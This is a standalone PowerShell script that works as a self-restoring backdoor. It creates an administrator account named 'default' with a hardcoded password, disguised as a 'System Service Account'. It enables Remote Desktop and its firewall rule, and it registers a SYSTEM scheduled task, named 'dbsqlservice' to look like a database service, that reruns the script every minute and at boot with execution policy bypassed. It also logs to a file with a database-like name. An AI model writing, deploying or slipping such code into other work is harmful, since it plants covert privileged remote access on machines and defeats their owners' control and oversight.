# ================= CONFIG =================
$Username = "default"
$PlainPassword = "Farel34153431!"
$TaskName = "dbsqlservice"
$LogFile = "C:\ProgramData\dbsql.log"
# ========================================

function Log($m){
    "$([DateTime]::Now) :: $m" | Out-File -Append $LogFile
}

function Fix-Profile {

    try {
        $sid = (Get-LocalUser $Username).SID.Value
        $profilePath = "C:\Users\$Username"

        if (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$sid") {
            Remove-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$sid" -Recurse -Force
            Log "Profile registry nuked"
        }

        if (Test-Path $profilePath){
            Remove-Item $profilePath -Recurse -Force
            Log "Profile folder nuked"
        }
    } catch {}
}

function Ensure-User {

    $SecurePassword = ConvertTo-SecureString $PlainPassword -AsPlainText -Force

    if (-not (Get-LocalUser $Username -ErrorAction SilentlyContinue)) {

        New-LocalUser `
            -Name $Username `
            -Password $SecurePassword `
            -FullName "System Service Account" `
            -Description "Auto-created SYSTEM user" `
            -PasswordNeverExpires `
            -AccountNeverExpires

        Add-LocalGroupMember Administrators $Username
        Add-LocalGroupMember "Remote Desktop Users" $Username

        Log "User recreated"
    }

    Enable-LocalUser $Username -ErrorAction SilentlyContinue
    Unlock-LocalUser $Username -ErrorAction SilentlyContinue
    Set-LocalUser $Username -Password $SecurePassword

    # RDP
    Set-ItemProperty HKLM:\System\CurrentControlSet\Control\TerminalServer -Name fDenyTSConnections -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue

    # TermService
    Set-Service TermService -StartupType Automatic
    Start-Service TermService -ErrorAction SilentlyContinue

    Log "User verified"
}

function Ensure-Rights {

    secedit /export /cfg C:\ProgramData\secpol.cfg | Out-Null

    $cfg = Get-Content C:\ProgramData\secpol.cfg

    if($cfg -notmatch $Username){
        Add-LocalGroupMember "Remote Desktop Users" $Username -ErrorAction SilentlyContinue
        Log "RDP rights fixed"
    }
}

function Ensure-Task {

    if (-not (Get-ScheduledTask $TaskName -ErrorAction SilentlyContinue)) {

        $action = New-ScheduledTaskAction -Execute powershell.exe -Argument "-ExecutionPolicy Bypass -File `"$PSCommandPath`""

        $boot = New-ScheduledTaskTrigger -AtStartup
        $loop = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)

        Register-ScheduledTask `
            -TaskName $TaskName `
            -Action $action `
            -Trigger @($boot,$loop) `
            -User SYSTEM `
            -RunLevel Highest `
            -Force | Out-Null

        Log "Task recreated"
    }
}

# ================= MAIN =================

Ensure-Task
Ensure-User
Ensure-Rights

# profile health check
if (-not (Test-Path "C:\Users\$Username")){
    Fix-Profile
}

Log "Heartbeat OK"
